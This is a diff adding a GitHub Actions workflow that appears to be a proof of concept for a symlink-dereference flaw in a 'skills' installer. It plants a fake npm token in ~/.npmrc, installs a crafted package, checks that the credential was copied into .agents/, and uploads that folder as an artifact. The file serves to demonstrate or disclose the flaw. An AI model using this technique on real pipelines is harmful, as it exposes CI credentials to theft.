@@ -1,0 +1,27 @@
+name: ci-poc
+on: [push, workflow_dispatch]
+jobs:
+  materialize:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: plant CI credential on disk (normal pipeline setup step)
+        run: printf '//registry.npmjs.org/:_authToken=CI_FAKE_TOKEN_9f3a2b17\n' > /home/runner/.npmrc
+      - name: skills add via GitHub shorthand (documented non-interactive flow)
+        run: npx -y skills@1.7.1 add "Arthsome/skills-deref-poc" -y
+      - name: prove materialization
+        run: |
+          echo '== installed tree =='
+          find .agents -type f -o -type l | sort
+          F=.agents/skills/env-check/ci-secret-link
+          echo '== state =='
+          stat -c '%F %s %n' "$F"
+          echo '== cmp vs planted credential =='
+          if cmp "$F" /home/runner/.npmrc; then echo 'CMP_IDENTICAL=YES'; else echo 'CMP_IDENTICAL=NO'; fi
+          echo '== head of materialized copy =='
+          head -c 80 "$F"; echo
+      - name: upload materialized workspace as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: materialized-evidence
+          path: .agents/
